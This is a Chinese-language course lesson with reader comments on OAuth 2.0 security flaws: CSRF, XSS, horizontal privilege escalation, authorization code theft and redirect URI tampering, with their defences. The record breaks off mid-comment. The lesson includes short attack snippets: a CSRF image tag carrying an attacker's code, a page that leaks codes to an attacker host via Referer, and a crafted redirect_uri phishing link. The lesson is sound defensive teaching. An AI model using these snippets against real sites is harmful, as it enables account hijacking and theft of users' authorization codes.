{"id":261403,"title":"08 | 实践OAuth 2.0时，使用不当可能会导致哪些安全漏洞？","content":"<p>你好，我是王新栋。</p><p>当知道这一讲的主题是OAuth 2.0的安全漏洞时，你可能要问了：“OAuth 2.0 不是一种安全协议吗，不是保护Web API的吗？为啥OAuth 2.0自己还有安全的问题了呢？”</p><p>首先，OAuth 2.0 的确是一种安全协议。这没啥问题，但是它有很多使用规范，比如授权码是一个临时凭据只能被使用一次，要对重定向URI做校验等。那么，如果使用的时候你没有按照这样的规范来实施，就会有安全漏洞了。</p><p>其次，OAuth 2.0既然是“生长”在互联网这个大环境中，就一样会面对互联网上常见安全风险的攻击，比如跨站请求伪造（Cross-site request forgery，CSRF）、跨站脚本攻击（Cross Site Scripting，XSS）。</p><p>最后，除了这些常见攻击类型外，OAuth 2.0 自身也有可被利用的安全漏洞，比如授权码失窃、重定向URI伪造。</p><p>所以，我们<strong>在实践OAuth 2.0的过程中，安全问题一定是重中之重</strong>。接下来，我挑选了5个典型的安全问题，其中CSRF、XSS、水平越权这三种是互联网环境下常见的安全风险，授权码失窃和重定向URI被篡改属于OAuth2.0“专属”的安全风险。接下来，我就和你一起看看这些安全风险的由来，以及如何应对吧。</p><!-- [[[read_end]]] --><h2>CSRF攻击</h2><p>对于CSRF的定义，《OAuth 2 in Action》这本书里的解释，是我目前看到的最为贴切的解释：恶意软件让浏览器向<strong>已完成用户身份认证</strong>的网站发起请求，并<strong>执行有害的操作</strong>，就是跨站请求伪造攻击。</p><p>它是互联网上最为常见的攻击之一。我们在实践OAuth2.0的过程，其实就是在构建一次互联网的应用。因此，OAuth 2.0同样也会面临这个攻击。接下来，我通过一个案例和你说明这个攻击类型。</p><p>有一个软件 A，我们让它来扮演攻击者，让它的开发者按照正常的流程使用极客时间。当该攻击者授权后，拿到授权码的值 codeA之后，“立即按下了暂停键”，不继续往下走了。那它想干啥呢，我们继续往下看。</p><p>这时，<strong>有一个第三方软件B，比如咱们的Web版极客时间，来扮演受害者吧。<strong>当然最终的受害者是用户，这里是用Web版极客时间来作为被软件A攻击的对象</strong>。</strong></p><p>极客时间用于接收授权码的回调地址为 <code>https://time.geekbang.org/callback</code>。有一个用户G已经在极客时间的平台登录，且对极客时间进行了授权，也就是用户G已经在极客时间平台上有登录态了。</p><p>如果此时攻击者软件A，在自己的网站上构造了一个恶意页面：</p><pre><code>&lt;html&gt;\n&lt;img src =&quot;https://time.geekbang.org/callback？code=codeA&quot;&gt;\n&lt;/html&gt;\n</code></pre><p>如果这个时候用户G被攻击者软件A诱导而点击了这个恶意页面，那结果就是，极客时间使用codeA值去继续OAuth 2.0的流程了。这其实就走完了一个CSRF攻击的过程，如下图所示：</p><p><img src=\"https://static001.geekbang.org/resource/image/f1/fe/f12446c76ffcbb58b8ce00c3f874f8fe.png?wh=1282*1052\" alt=\"\" title=\"图1 CSRF攻击过程\"></p><p>如果我们将OAuth 2.0用于了身份认证，那么就会造成严重的后果，因为用户G使用的极客时间的<strong>授权上下文环境</strong>跟攻击者软件A的<strong>授权上下文环境</strong>绑定在了一起。为了解释两个上下文环境绑定在一起可能带来的危害，我们还是拿极客时间来举例。</p><p>假如，极客时间提供了用户账号和微信账号做绑定的功能，也就是说用户先用自己的极客时间的账号登录，然后可以绑定微信账号，以便后续可以使用微信账号来登录。在绑定微信账号的时候，微信会咨询你是否给极客时间授权，让它获取你在微信上的个人信息。这时候，就需要用到OAuth 2.0的授权流程。</p><p>如果攻击者软件A，通过自己的极客时间账号事先做了上面的绑定操作，也就是说攻击者已经可以使用自己的微信账号来登录极客时间了。那有一天，软件A想要“搞事情”了，便在发起了一个授权请求后构造了一个攻击页面，里面包含的模拟代码正如我在上面描述的那样，来诱导用户G点击。</p><p>而用户G已经用极客时间的账号登录了极客时间，此时正要去做跟微信账号的绑定。如果这个时候他刚好点击了攻击者A“种下”的这个恶意页面，那么后面换取授权的访问令牌access_token，以及通过accces_token获取的信息就都是攻击者软件A的了。</p><p>这就相当于，用户G将自己的极客时间的账号跟攻击者软件A的微信账号绑定在了一起。这样一来，后续攻击者软件A就能够通过自己的微信账号，来登录用户G的极客时间了。这个后果可想而知。</p><p>那如何避免这种攻击呢？方法也很简单，实际上OAuth 2.0中也有这样的建议，就是<strong>使用state参数</strong>，它是一个随机值的参数。</p><p>还是以上面的场景为例，当极客时间请求授权码的时候附带一个自己生成state参数值，同时授权服务也要按照规则将这个随机的state值跟授权码code一起返回给极客时间。这样，当极客时间接收到授权码的时候，就要在极客时间这一侧做一个state参数值的比对校验，如果相同就继续流程，否则直接拒绝后续流程。</p><p>在这样的情况下，软件A要想再发起CSRF攻击，就必须另外构造一个state值，而这个state没那么容易被伪造。这本就是一个随机的数值，而且在生成时就遵从了被“猜中”的概率要极小的建议。比如，生成一个6位字母和数字的组合值，显然要比生成一个6位纯数字值被“猜中”的概率要小。所以，软件B通过使用state参数，就实现了一个基本的防跨站请求伪造保护。</p><p>我们再来总结下，这个攻击过程本质上就是，软件A（攻击者）用自己的授权码codeA的值，通过CSRF攻击，“替换”了软件B的授权码的值。</p><p>接下来，我再给你看一种互联网常见的安全攻击类型，也就是XSS攻击。</p><h2>XSS攻击</h2><p>XSS攻击的主要手段是将恶意脚本注入到请求的输入中，攻击者可以通过注入的恶意脚本来进行攻击行为，比如搜集数据等。截止到2020年6月23日，在OWASP（一个开源的Web应用安全项目）上查看安全漏洞排名的话，它依然在<a href=\"https://owasp.org/www-project-top-ten/\">TOP10</a>榜单上面，可谓“大名鼎鼎”。</p><p>网络上有很多关于XSS的介绍了，我推荐你看看<a href=\"https://segmentfault.com/a/1190000013315450\">《XSS攻击原理分析与防御技术》</a>这篇文章，它很清晰地分析了XSS的原理以及防御方法。今天，我们主要看看它是怎么在OAuth 2.0的流程中“发挥”的。</p><p>当请求抵达受保护资源服务时，系统需要做校验，比如第三方软件身份合法性校验、访问令牌access_token的校验，如果这些信息都不能被校验通过，受保护资源服务就会返回错误的信息。</p><p><img src=\"https://static001.geekbang.org/resource/image/07/93/076a8f694f76b8a65cc105b54c280e93.png?wh=1306*760\" alt=\"\" title=\"图2 XSS攻击过程\"></p><p>大多数情况下，受保护资源都是把输入的内容，比如app_id invalid、access_token invalid ，再回显一遍，这时就会被XSS攻击者捕获到机会。试想下，如果攻击者传入了一些恶意的、搜集用户数据的JavaScript 代码，受保护资源服务直接原路返回到用户的页面上，那么当用户触发到这些代码的时候就会遭受到攻击。</p><p>因此，受保护资源服务就需要对这类XSS漏洞做修复，而具体的修复方法跟其它网站防御XSS类似，最简单的方法就是<strong>对此类非法信息做转义过滤</strong>，比如对包含<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;a&gt;</code>等标签的信息进行转义过滤。</p><p>CSRF攻击、XSS攻击是我从OWASP网站上挑选的两个最为熟知的两种攻击类型，它们应该是所有Web系统都需要共同防范的。我们在实施OAuth 2.0 架构的时候，也一定要考虑到这层防护，否则就会给用户造成伤害。接下来，我再带着你了解一下水平越权攻击。</p><h2>水平越权</h2><p><strong>水平越权是指，在请求受保护资源服务数据的时候，服务端应用程序未校验这条数据是否归属于当前授权的请求用户</strong>。这样不法者用自己获得的授权来访问受保护资源服务的时候，就有可能获取其他用户的数据，导致水平越权漏洞问题的发生。攻击者可越权的操作有增加、删除、修改和查询，无论更新操作还是查询操作都有相当的危害性。</p><p>这么说可能有些抽象，我们看一个具体的例子。</p><p>还是以我们的“小兔打单软件”为例，第三方开发者开发了这款打单软件，目前有两个商家A和商家B购买并使用。现在小兔打单软件上面提供了根据订单ID查询订单数据的功能，如下图所示。</p><p><img src=\"https://static001.geekbang.org/resource/image/42/77/42c7534227ffcd72f05db518e6b76577.png?wh=1406*608\" alt=\"\" title=\"图3 水平越权发生场景\"></p><p>商家A和商家B分别给小兔打单软件应用做了授权，也就是说，小兔打单软件可以获取商家A和商家B的订单数据。此时没有任何问题，<strong>那么商家A可以获取商家B的订单数据吗？</strong>答案是，极有可能的。</p><p>在开放平台环境下，授权关系的校验是由一般由开放网关这一层来处理，因为受保护资源服务会散落在各个业务支持部门。请求数据通过开放网关之后由访问令牌access_token获取了用户的身份，比如商家ID，就会透传到受保护资源服务，也就是上游接口提供方的系统。</p><p>此时，如果受保护资源服务没有对商家ID和订单ID做归属判断，就有可能发生商家A获取商家B订单数据的问题，造成水平越权问题。</p><p><img src=\"https://static001.geekbang.org/resource/image/0e/4f/0eaa1a1c991ee25406a85e9dfa17b64f.png?wh=996*878\" alt=\"\" title=\"图4 水平越权示例图\"></p><p>发生水平越权问题的根本原因，还是开发人员的认知与意识不够。如果认知与意识跟得上，那在设计之初增加归属关系判断，比如上面提到的订单ID和商家ID的归属关系判断，就能在很大程度上避免这个漏洞。</p><p>同时，在开放平台环境下，由于开放网关和数据接口提供方来自不同的业务部门，防止水平校验的逻辑处理很容易被遗漏：</p><ul>\n<li>一方面，开放网关的作用是将用户授权之后的访问令牌access_token信息转换成真实的用户信息，比如上面提到的商家ID，然后传递到接口提供方，数据归属判断逻辑只能在接口提供方内部处理；</li>\n<li>另一方面，数据提供方往往会认为开放出的接口是被“跟自己一个公司的系统所调用的”，容易忽略水平校验的逻辑处理。</li>\n</ul><p>所以，在开放平台环境下，我们就要更加重视与防范数据的越权问题。</p><p>以上，CSRF攻击、XSS攻击、水平越权这三种攻击类型，它们都属于OAuth 2.0面临的互联网非常常见的通用攻击类型。而对于其他的互联网攻击类型，如果你想深入了解的话，可以看一下这篇<a href=\"https://wooyun.js.org/drops/OAuth%202.0%E5%AE%89%E5%85%A8%E6%A1%88%E4%BE%8B%E5%9B%9E%E9%A1%BE.html\">安全案例回顾</a>的文章。</p><p>接下来，我们再看两种OAuth 2.0专有的安全攻击，分别是授权码失窃、重定向URI被篡改。</p><h2>授权码失窃</h2><p>我们举个例子，先来学习授权码失窃这个场景。</p><p>如果第三方软件A有合法的app_id和app_secret，那么当它去请求访问令牌的时候，也是合法的。这个时候没有任何问题，让我们继续。</p><p>如果有一个用户G对第三方软件B，比如极客时间，进行授权并产生了一个授权码codeB，但并没有对攻击者软件A授权。此时，软件A是不能访问用户G的所有数据的。但这时，如果软件A获取了这个codeB，是不是就能够在没有获得用户G授权的情况下访问用户G的数据了？整个过程如下图所示。</p><p><img src=\"https://static001.geekbang.org/resource/image/7d/7b/7d464d5a0c49a77862fef10f77cf057b.png?wh=1690*926\" alt=\"\" title=\"图5 授权码失窃攻击过程\"></p><p><strong>这时问题的根源就在于两点：</strong></p><ul>\n<li>授权服务在进行授权码校验的时候，没有校验app_id_B；</li>\n<li>软件B（也就是极客时间）使用过一次codeB的值之后，授权服务没有删除这个codeB；</li>\n</ul><p>看到这里，通过校验app_id_B，并删除掉使用过一次的授权码及其对应的访问令牌，就可以从根本上来杜绝授权码失窃带来的危害了。</p><p>说到这里，你不禁要问了，授权码到底是怎么失窃的呢？接下来，我要介绍的就是授权码失窃的可能的方法之一，这也是OAuth 2.0中因重定向URI校验方法不当而遭受到的一种危害。这种安全攻击类型，就是重定向URI被篡改。</p><h2>重定向URI被篡改</h2><p>有的时候，授权服务提供方并没有对第三方软件的回调URI做完整性要求和完整性校验。比如，第三软件B极客时间的详细回调URI是<code>https://time.geekbang.org/callback</code>，那么在完整性校验缺失的情况下，只要以<code>https://time.geekbang.org</code>开始的回调URI地址，都会被认为是合法的。</p><p>此时，如果黑客在<code>https://time.geekbang.org/page/</code>下，创建了一个页面<strong>hacker.html</strong>。这个页面的内容可以很简单，其目的就是让请求能够抵达攻击者的服务。</p><pre><code>&lt;html&gt;\n&lt;img src =&quot;https://clientA.com/catch&quot;&gt;\n&lt;/html&gt;\n</code></pre><p>好了，我们继续看下接下来的攻击流程：</p><p><img src=\"https://static001.geekbang.org/resource/image/04/41/04d71e6a8d32fe8b516db7e7424bf141.png?wh=1610*1260\" alt=\"\" title=\"图6 重定向URI被篡改的攻击过程\"></p><p>首先，黑客将构造的攻击页面放到对应的hacker.html上，也就是<code>https://time.geekbang.org/page/hacker.html</code>上 ，同时构造出了一个新的重定向URI，即<code>https://time.geekbang.org/page/welcome/back.html../hacker.html</code>。</p><p>然后，黑客利用一些钓鱼手段诱导用户，去点击下面的这个地址：</p><pre><code>https://oauth-server.com/auth?respons_type=code&amp;client_id=CLIENTID&amp;redirect_uri=https://time.geekbang.org/page/welcome/back.html../hacker.html\n</code></pre><p>这样当授权服务做出响应进行重定向请求的时候，授权码code就返回到了hacker.html这个页面上。</p><p>最后，黑客在<code>https://clientA.com/catch</code>页面上，解析Referrer头部就会得到用户的授权码，继而就可以像授权码失窃的场景中那样去换取访问令牌了。</p><p>看到这里我们就知道了，如果授权服务要求的回调URI是<code>https://time.geekbang.org/callback</code>，并做了回调URI的完整性校验，那么被篡改之后的回调地址<code>https://time.geekbang.org/page/welcome/back.html../hacker.html</code>就不会被授权服务去发起重定向请求。</p><p>严格来讲，要发生这样的漏洞问题，条件还是比较苛刻的。从图6的重定向URI被篡改的流程中，也可以看到，只要我们在授权服务验证第三方软件的请求时做了签名校验，那么攻击者在只拿到授权码code的情况下，仍然无法获取访问令牌，因为第三方软件只有通过访问令牌才能够访问用户的数据。</p><p>但是，如果这些防范安全风险的规范建议你通通都没有遵守，那就是在给攻击者“大显身手”的机会，让你的应用软件以及用户遭受损失。</p><h2>总结</h2><p>好了，以上就是今天的主要内容了。我们一起学习了OAuth 2.0相关的常见又比较隐蔽的5种安全问题，包括CSRF攻击、XSS攻击、水平越权、授权码失窃、重定向URI被篡改。更多关于OAuth 2.0 安全方面的内容，你也可以去翻阅《OAuth 2 in Action》这本书。</p><p>通过这一讲的学习，你需要记住以下三个知识点：</p><ol>\n<li>互联网场景的安全攻击类型比如CSRF、XSS等，在OAuth 2.0中一样要做防范，因为OAuth 2.0本身就是应用在互联网场景中。</li>\n<li>除了常见的互联网安全攻击，OAuth 2.0也有自身的安全风险问题，比如我们讲到的授权码失窃、重定向URI被篡改。</li>\n<li>这些安全问题，本身从攻击的“技术含量”上并不高，但导致这些安全风险的因素，往往就是开发人员的安全意识不够。比如，没有意识到水平越权中的数据归属逻辑判断，需要加入到代码逻辑中。</li>\n</ol><p>其实，OAuth 2.0 的规范里面对这些安全问题都有对应的规避方式，但都要求我们使用的时候一定要非常严谨。比如，重定向URI的校验方式，规范里面是允许模糊校验的，但在结合实际环境的时候，我们又必须做到精确匹配校验才可以保障OAuth 2.0流转的安全性。</p><p>最后，我还整理了一张知识脑图，总结了这5种攻击方式的内容，来帮助你理解与记忆。</p><p><img src=\"https://static001.geekbang.org/resource/image/47/7f/479c2f3945d7a8e186f91f58b89db57f.jpg?wh=1920*1063\" alt=\"\"></p><h2>思考题</h2><ol>\n<li>\n<p>今天我们讲的这些安全问题，都是站在“守”的一方，并没有告诉你如何 “绞尽脑汁” 地利用漏洞。所谓“知己知彼，百战不殆”，现在你站在“攻”的一方来考虑下，除了重定向URI被篡改，还有什么其它的授权码被盗的场景吗？</p>\n</li>\n<li>\n<p>你认为还有哪些安全风险，是专属于OAuth 2.0的吗？</p>\n</li>\n</ol><p>欢迎你在留言区分享你的观点，也欢迎你把今天的内容分享给其他朋友，我们一起交流。</p>","comments":[{"had_liked":false,"id":302019,"user_name":"KeepGoing","can_delete":false,"product_type":"c1","uid":1184637,"ip_address":"","ucode":"B872F794265709","user_header":"https://static001.geekbang.org/account/avatar/00/12/13/7d/1454db9c.jpg","comment_is_top":false,"comment_ctime":1626023009,"is_pvip":true,"discussion_count":4,"race_medal":0,"score":"40280728673","product_id":100053901,"comment_content":"关于CSRF的例子特别是那个配图看来看去还是很难理解。关于State的解释更是让人困惑。<br>攻击者到底是在具体哪一步替换CODE的？既然授权服务会原封不动的返回State值。那攻击者又为什么需要自己来构造State值？","like_count":9,"discussions":[{"author":{"id":1047637,"avatar":"https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTJcwXucibksEYWRmibTZj9pb3d5ibfVQHFS9shvJmgMgtN3BM3r9qiaL5YTZSFdLvPZiaEHfBia4dFODVqw/132","nickname":"北国骑士","note":"","ucode":"AC657FCA2014ED","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":573150,"discussion_content":"我真想骂这个作者","likes_number":1,"is_delete":false,"is_hidden":false,"ctime":1653221869,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":1,"child_discussions":[{"author":{"id":1481979,"avatar":"https://static001.geekbang.org/account/avatar/00/16/9c/fb/7fe6df5b.jpg","nickname":"陈卧虫","note":"","ucode":"44BB84712436AB","race_medal":3,"user_type":1,"is_pvip":true},"reply_author":{"id":1047637,"avatar":"https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTJcwXucibksEYWRmibTZj9pb3d5ibfVQHFS9shvJmgMgtN3BM3r9qiaL5YTZSFdLvPZiaEHfBia4dFODVqw/132","nickname":"北国骑士","note":"","ucode":"AC657FCA2014ED","race_medal":0,"user_type":1,"is_pvip":true},"discussion":{"id":588293,"discussion_content":"具体哪里不懂可以提问的","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1663654884,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":573150,"ip_address":"浙江"},"score":588293,"extra":""}]},{"author":{"id":1816609,"avatar":"https://static001.geekbang.org/account/avatar/00/1b/b8/21/f692bdb0.jpg","nickname":"路在哪","note":"","ucode":"A4822AD07AD102","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":580120,"discussion_content":"没有实际应用过就感觉讲的太模糊了\n","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1657879852,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]},{"author":{"id":2935393,"avatar":"","nickname":"hackeren","note":"","ucode":"AB8DD7AB6C866D","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":554952,"discussion_content":"这个CSRF完全看不懂","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1646695682,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":239750,"user_name":"Geek_94f887","can_delete":false,"product_type":"c1","uid":1902367,"ip_address":"","ucode":"8AFAB4D4511A80","user_header":"","comment_is_top":false,"comment_ctime":1596632755,"is_pvip":false,"replies":[{"id":"88575","content":"<br>攻击者A并不是一个第三方开发者，他也是极客时间的一个合法用户，我们这里是有【三方软件A】是想说明这个攻击者“有能力”构建了一个软件页面。<br><br>并不存在appidA，appid 一直是极客时间的appid，图中app_id_b也是极客时间的appid，这里用了“b”，只是想区分这两次“请求”。<br><br>因为CSRF比较知名，咱们在文中并没有过多对它做基础性解释。在理解这篇文章CSRF攻击的例子时候，可以想象一个成语“移花接木”。","user_name":"作者回复","user_name_real":"王新栋","uid":"1352303","ctime":1596676078,"ip_address":"","comment_id":239750,"utype":1}],"discussion_count":3,"race_medal":0,"score":"40251338419","product_id":100053901,"comment_content":"codeA绑定了appIdA和userIdA，为啥B能拿着appIdB和codeA，userIdB，userIdB不会验证通过，怎么可以获取到access_token？<br>另外，老师举例的CSRF例子我看了三遍，都没看明白，有点混乱，不够清晰，建议重写一下，感谢！~","like_count":9,"discussions":[{"author":{"id":1352303,"avatar":"https://static001.geekbang.org/account/avatar/00/14/a2/6f/d239ed80.jpg","nickname":"王新栋","note":"","ucode":"0A5D089B8E1E9D","race_medal":0,"user_type":2,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":503203,"discussion_content":"\n攻击者A并不是一个第三方开发者，他也是极客时间的一个合法用户，我们这里是有【三方软件A】是想说明这个攻击者“有能力”构建了一个软件页面。\n\n并不存在appidA，appid 一直是极客时间的appid，图中app_id_b也是极客时间的appid，这里用了“b”，只是想区分这两次“请求”。\n\n因为CSRF比较知名，咱们在文中并没有过多对它做基础性解释。在理解这篇文章CSRF攻击的例子时候，可以想象一个成语“移花接木”。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1596676078,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1047637,"avatar":"https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTJcwXucibksEYWRmibTZj9pb3d5ibfVQHFS9shvJmgMgtN3BM3r9qiaL5YTZSFdLvPZiaEHfBia4dFODVqw/132","nickname":"北国骑士","note":"","ucode":"AC657FCA2014ED","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":573149,"discussion_content":"我晕，这表达能力真是绝了，就不能交行清楚吗，又是软件A又是极客时间的，不明所以，这写得太不负责任了","likes_number":1,"is_delete":false,"is_hidden":false,"ctime":1653221766,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":1,"child_discussions":[{"author":{"id":2906824,"avatar":"","nickname":"Geek_d09cb6","note":"","ucode":"46EE3C9E571E26","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":1047637,"avatar":"https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTJcwXucibksEYWRmibTZj9pb3d5ibfVQHFS9shvJmgMgtN3BM3r9qiaL5YTZSFdLvPZiaEHfBia4dFODVqw/132","nickname":"北国骑士","note":"","ucode":"AC657FCA2014ED","race_medal":0,"user_type":1,"is_pvip":true},"discussion":{"id":578502,"discussion_content":"对于微信来说，极客时间只有一个appid，不同的极客时间用户appid都是一样的","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1656837751,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":573149,"ip_address":""},"score":578502,"extra":""}]}]},{"had_liked":false,"id":235127,"user_name":"袁帅","can_delete":false,"product_type":"c1","uid":1084993,"ip_address":"","ucode":"A71A89B9F1BD69","user_header":"https://static001.geekbang.org/account/avatar/00/10/8e/41/709e9677.jpg","comment_is_top":false,"comment_ctime":1594900645,"is_pvip":true,"replies":[{"id":"86822","content":"原图有一处描述不当，会引起大家理解偏差，现已修正。<br>1、不需要知道URL；2、不需要嵌入极客时间平台，你可以理解为钓鱼页面，有个重要的前提是被攻击者已经在极客时间平台登录了，有登录态了；3、攻击者A并不是一个第三方开发者，他也是极客时间的一个合法用户，我们这里是有三方软件A是想说明这个攻击者构建了一个软件页面。","user_name":"作者回复","user_name_real":"王新栋","uid":"1352303","ctime":1594913063,"ip_address":"","comment_id":235127,"utype":1}],"discussion_count":2,"race_medal":0,"score":"14479802533","product_id":100053901,"comment_content":"对于CSRF攻击有以下疑惑<br>    1.  攻击者A软件怎么知道  极课时间(B)的用于接受授权码的回调URL?<br>    2.&quot;如果这个时候用户 G 被攻击者软件 A 诱导而点击了这个恶意页面，那结果就是，极客时间使用 codeA 值去继续 OAuth 2.0 的流程了。这其实就走完了一个 CSRF 攻击的过程&quot;                              <br>           软件A的诱导页面是怎么放到极课时间平台里的？<br>3.极客时间通过codeA获取到了accessToken,但这一切都是在极客时间的后台完成的呀，攻击者A又是怎么得到token的？<br>","like_count":3,"discussions":[{"author":{"id":1352303,"avatar":"https://static001.geekbang.org/account/avatar/00/14/a2/6f/d239ed80.jpg","nickname":"王新栋","note":"","ucode":"0A5D089B8E1E9D","race_medal":0,"user_type":2,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":501608,"discussion_content":"原图有一处描述不当，会引起大家理解偏差，现已修正。\n1、不需要知道URL；2、不需要嵌入极客时间平台，你可以理解为钓鱼页面，有个重要的前提是被攻击者已经在极客时间平台登录了，有登录态了；3、攻击者A并不是一个第三方开发者，他也是极客时间的一个合法用户，我们这里是有三方软件A是想说明这个攻击者构建了一个软件页面。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1594913063,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1084993,"avatar":"https://static001.geekbang.org/account/avatar/00/10/8e/41/709e9677.jpg","nickname":"袁帅","note":"","ucode":"A71A89B9F1BD69","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":291793,"discussion_content":"现在理解了\n\n用户G 在极客时间平台绑定微信 拿到的是CodeA的(攻击者的code) access_token , 获取到的也是A的openid , 落库的时候，G用户和A的微信绑定在了一起，那么A 用微信授权登录的时候，通过A的openid 获取到的就是G的用户信息，这就是CSRF攻击。\n解决通过state\n获取code时候，随机生成一个state，保存在session中，授权码回调的时候返回state,和session中的state做比较，从而决定时候继续","likes_number":1,"is_delete":false,"is_hidden":false,"ctime":1594954503,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":275237,"user_name":"Dolphin","can_delete":false,"product_type":"c1","uid":1284855,"ip_address":"","ucode":"0481DE78AE7CB5","user_header":"https://static001.geekbang.org/account/avatar/00/13/9a/f7/6ff76318.jpg","comment_is_top":false,"comment_ctime":1611404797,"is_pvip":false,"discussion_count":4,"race_medal":0,"score":"10201339389","product_id":100053901,"comment_content":"老师好，关于 CSRF 中 state 的问题，原文中支出：<br>当极客时间请求授权码的时候附带一个自己生成 state 参数值，同时授权服务也要按照规则将这个随机的 state 值跟授权码 code 一起返回给极客时间。这样，当极客时间接收到授权码的时候，就要在极客时间这一侧做一个 state 参数值的比对校验，如果相同就继续流程，否则直接拒绝后续流程。<br><br>我的问题：<br>在请求授权码的时候 附带了一个 state 的值，然后 state 会和授权码一起被返回，这时候攻击者按下暂停，然后在钓鱼页面中同样携带这个 state 是不是同样不安全？<br><br>我理解的是这样？是我哪儿理解错了嘛？","like_count":2,"discussions":[{"author":{"id":2709561,"avatar":"https://static001.geekbang.org/account/avatar/00/29/58/39/3c614bd4.jpg","nickname":"windyRonnie","note":"","ucode":"3BFEAC653DE431","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":532100,"discussion_content":"CSRF attacks are usually rebuffed with a CSRF token (it’s also called state), and OAuth 2.0 is no exception. How to use the CSRF token:\n\n通常使用CSRF令牌(也称为state )来拒绝CSRF攻击，OAuth 2.0也不例外。 如何使用CSRF令牌：\n\nClient application generates and saves CSRF token on a client’s mobile device.\n\n客户端应用程序会生成CSRF令牌并将其保存在客户端的移动设备上。\n\nClient application includes the CSRF token in code access request.\n\n客户端应用程序将CSRF令牌包含在code访问请求中。\n\nServer returns the same CSRF token with code in its response.\n\n服务器在响应中返回带有code的相同CSRF令牌。\n\nClient application compares the incoming and saved CSRF tokens. If their values match, the process goes on.\n\n客户端应用程序比较传入和保存的CSRF令牌。 如果它们的值匹配，则过程继续。\n\nCSRF token requirements: nonce must be at least 256 bit and received from a good source of pseudo-random sequences.\n\nCSRF令牌要求： 随机数必须至少为256位，并且必须从良好的伪随机序列源中接收。\n\nIn a nutshell, CSRF token allows an application client to answer the following question: «Was that me who initiated access_token request or someone is trying to trick me?».\n\n简而言之，CSRF令牌允许应用程序客户端回答以下问题：“是发起access_token请求的我还是有人试图欺骗我？”。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1637513935,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"user_type\":1}","child_discussion_number":0,"child_discussions":[]},{"author":{"id":2166878,"avatar":"https://static001.geekbang.org/account/avatar/00/21/10/5e/42f4faf7.jpg","nickname":"天择","note":"","ucode":"ED2B08DB2F2B38","race_medal":1,"user_type":1,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":405015,"discussion_content":"仔细想想我觉得攻击者没那么容易拿到这个state 攻击者依赖的只有用户去点击他的链接，如果不点，他什么也做不了。包括state在内的敏感信息，只能是跟着用户在浏览器的请求走，不管是body，cookie，还是url，攻击者都是直接读取不到的。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1634481224,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1046714,"avatar":"https://static001.geekbang.org/account/avatar/00/0f/f8/ba/14e05601.jpg","nickname":"约书亚","note":"","ucode":"81EA27ADD9EC1A","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":400663,"discussion_content":"这恐怕需要极客时间的服务端存储state和用户的关系","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1633359765,"is_liked":false,"can_